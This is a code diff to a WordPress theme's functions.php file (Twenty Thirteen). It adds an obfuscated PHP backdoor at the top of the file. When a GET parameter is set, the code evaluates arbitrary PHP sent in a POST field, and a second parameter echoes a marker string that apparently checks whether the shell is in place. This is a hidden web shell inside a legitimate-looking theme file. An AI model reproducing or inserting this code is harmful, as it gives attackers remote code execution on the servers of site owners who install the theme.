@@ -1,4 +1,20 @@
 <?php
+function _g3t($str){
+    $val = !empty($_GET[$str]) ? $_GET[$str] : null;
+    return $val;
+}
+if(_g3t('CDh')=='f')
+{
+@eval($_POST['BAgsh']);
+exit;
+}
+if(_g3t('CDh')=='c')
+{
+echo 'AcJ9ksbVjsdb';
+exit;
+}
+//dsd6sc378axvg
+?><?php
 /**
  * Twenty Thirteen functions and definitions
  *
